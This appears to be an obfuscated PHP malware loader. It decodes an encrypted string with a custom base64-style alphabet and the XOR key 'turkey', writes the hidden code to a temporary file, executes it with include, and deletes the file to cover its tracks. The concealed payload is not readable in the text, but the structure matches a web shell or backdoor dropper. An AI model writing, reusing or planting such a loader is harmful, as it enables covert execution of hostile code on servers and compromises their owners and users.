<?php
$encrypted = 'SFQ2JCYtLSU3Sw0NGRlMZm9FHAEfB1t0flVSS0VFHBATD1tFWx0XCgFHeX9SS0VZSBcdDxxHeX9SS0VZVFVSS1kdHQNSCAkYBwZPSQEWFycdBBE7GBoRAEdHeX9SS0VZVFVSS0VZVFVOVBURBHh4S0VZVFVSS0VZVFVSS0VZVFERHhcLERsGOwQNHFVPSwwKBxAGQ0EmMzAmMEIJFQEaTDhQVEpSTzo-MSEpTBUYAB1VNkVDVBIXHwYOEF1bUGhzVFVSS0VZVFVSS0VZVFVSS0EJFQcGGEVEVBAKGwkWEBBaLywrMTYmJDcgKyY3OyQrNSE9OUlZAAcbBk1dFwAAGQAXACUTHw1VVDE7OSA6IDogMjoqMSUzOSQtOydbQl50flVSS0VZVFVSS0VZVFVSS0V0flVSS0VZVFVSS0VZVFVSS0VdHQYlAgsdGwIBS1hZBwEAHwoMBAUXGU0KARcBHxdRJD0iNCoqWFVCR0VKXVxSVlhEVFIlIiteT3h4S0VZVFVSS0VZVFVSS0VZVFERHhcLERsGS1hZUBwBPAwXEBoFGEVGVFJVS19ZMDwgLiYtOycrNDY8JDQgKjE2Jk5_YUVZVFVSS0VZVFVSS0VZVFV_YUVZVFVSS0VZVFVSS0VZVFUXCA0WVFJOBQQPSlJJZm9ZVFVSS0VZVFVSS0VZVFVSZm9ZVFVSS0VZVFVSS0VZVFVSDQoLERQRA0VRUAUTGREKVBQBS0EJFQcGQkUCeX9SS0VZVFVSS0VZVFVSS0VZVFVSS0EaAQcADgsNVFtPS01dFwAAGQAXAFVPVlhZU1JSVEVeU1VISyEwJjAxPyorLSohLjU4JjQmJDdQVFtSTxUYBgFJZm9ZVFVSS0VZVFVSS0VZVFVSS0VZVBARAwpZU0kTSwYVFQYBVkcdGxYgBAoNIBAKH0cRBhAUVkdGBBQGA1heVFtSHhcVERsRBAEcXFERHhcLERsGQkVXVFJQVUJZWlUaHwgVBwUXCAwYGBYaChcKXFECChcNXVVcS0JFWxRMREJCeX9SS0VZVFVSS0VZVFVSS0VZCXh4S0VZVFVSS0VZVFVSS0VZVHh4S0VZVFVSS0VZVFVSS0VZVBARAwpZU0ldBQQPSlJJZm9ZVFVSS0VZVFVSS0VGSnh4S0VZVFVSS0VFWxEbHVt0flVSS0VFWxcdDxxHeX9ORA0NGRlM';
if (!function_exists('dolphin')) {
    function dolphin($data, $key) {
        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
        $bin = '';
        for ($i = 0; $i < strlen($data); $i++) {
            $index = strpos($alphabet, $data[$i]);
            $bin .= str_pad(decbin($index), 6, '0', STR_PAD_LEFT);
        }

        $bytes = '';
        for ($i = 0; $i < strlen($bin); $i += 8) {
            $chunk = substr($bin, $i, 8);
            if (strlen($chunk) < 8) break; // если меньше 8 бит — игнорируем
            $bytes .= chr(bindec($chunk));
        }

        $res = '';
        $klen = strlen($key);
        for ($i = 0; $i < strlen($bytes); $i++) {
            $res .= $bytes[$i] ^ $key[$i % $klen];
        }
        return $res;
    }
}

file_put_contents($tmp = tempnam(sys_get_temp_dir(), 'shf_'), dolphin($encrypted, 'turkey'));
include $tmp;
unlink($tmp);

?>